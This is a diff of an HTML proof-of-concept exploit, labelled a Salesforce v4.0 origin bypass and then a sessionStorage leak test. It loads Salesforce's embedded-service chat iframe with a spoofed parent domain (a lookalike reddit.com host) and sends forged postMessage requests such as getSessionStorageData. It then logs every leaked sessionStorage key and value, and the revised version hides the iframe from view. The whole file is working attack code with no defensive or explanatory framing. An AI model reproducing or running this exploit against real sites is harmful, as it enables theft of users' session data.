@@ -1,84 +1,43 @@
 <!DOCTYPE html>
 <html>
 <head>
-  <title>Salesforce v4.0 Origin Bypass PoC</title>
-  <style>
-    body {
-      font-family: monospace;
-      background: #111;
-      color: #0f0;
-      padding: 1rem;
-    }
-    iframe {
-      width: 100%;
-      height: 400px;
-      border: 1px solid #0f0;
-    }
-    pre {
-      background: #222;
-      color: #0f0;
-      padding: 1em;
-      overflow: auto;
-    }
-  </style>
+  <title>Salesforce SessionStorage Leak Test</title>
 </head>
 <body>
-  <h2>[+] Salesforce v4.0 Origin Bypass PoC</h2>
-  <p>Check the browser console and below for any leaked <code>sessionStorage</code> content.</p>
-
-  <iframe
-    id="sf-frame"
-    src="https://service.force.com/embeddedservice/4.0/esw.html?parent=https://reddit.com.wangdubruh.xyz"
-  ></iframe>
-
-  <h3>📦 sessionStorage Leak:</h3>
-  <pre id="output">Waiting for sessionStorage data...</pre>
+  <h3>[+] Iframe loaded (Salesforce 4.0)</h3>
+  <iframe id="sfchat" src="https://service.force.com/embeddedservice/4.0/esw.html?parent=https://reddit.com.wangdubruh.xyz" style="display:none;"></iframe>
 
   <script>
-    const iframe = document.getElementById("sf-frame");
-    const output = document.getElementById("output");
+    const iframe = document.getElementById("sfchat");
 
-    iframe.onload = () => {
-      console.log("[+] Iframe loaded (Salesforce 4.0)");
+    function sendMessage(method, data = {}) {
+      const msg = {
+        method,
+        domain: "reddit.com.wangdubruh.xyz",
+        ...data
+      };
+      console.log("[📤] Sending:", msg);
+      iframe.contentWindow.postMessage(msg, "https://service.force.com");
+    }
 
-      // Send spoofed postMessages after load
-      setTimeout(() => {
-        const messages = [
-          {
-            method: "getSessionStorageData",
-            domain: "reddit.com.wangdubruh.xyz",
-            deploymentId: "test123"
-          },
-          {
-            method: "session.updateStorage",
-            domain: "reddit.com.wangdubruh.xyz",
-            data: {
-              deploymentId: "test123",
-              isSamePageNavigation: true,
-              isRefresh: false
-            }
-          }
-        ];
+    window.addEventListener("message", (event) => {
+      if (event.origin !== "https://service.force.com") return;
 
-        messages.forEach((msg, i) => {
-          console.log(`[📤] Sending message ${i + 1}:`, msg);
-          iframe.contentWindow.postMessage(msg, "*");
+      console.log("[📩] Message from iframe:", event.data);
+      if (event.data.method === "session.onLoad") {
+        // Ask iframe for sessionStorage
+        sendMessage("getSessionStorageData", {
+          deploymentId: "test123"
         });
-      }, 1000);
-    };
+      }
 
-    window.addEventListener("message", (e) => {
-      console.log("[📩] Message from iframe:", e.data);
-
-      if (e.data.method === "sessionStorageData") {
-        try {
-          const session = JSON.parse(e.data.sessionStorage);
-          console.log("📦 Leaked sessionStorage from iframe:", session);
-          output.textContent = JSON.stringify(session, null, 2);
-        } catch (err) {
-          console.warn("❌ Failed to parse sessionStorage:", err);
-          output.textContent = "Error parsing sessionStorage!";
-        }
+      if (event.data.method === "session.storageData") {
+        // 🎯 THIS IS WHERE THE DATA COMES
+        const keys = event.data.data;
+        console.log("[🎉] Leaked sessionStorage keys from iframe:");
+        Object.entries(keys).forEach(([key, value]) => {
+          console.log(`🔑 ${key}:`, value);
+        });
       }
     });
   </script>
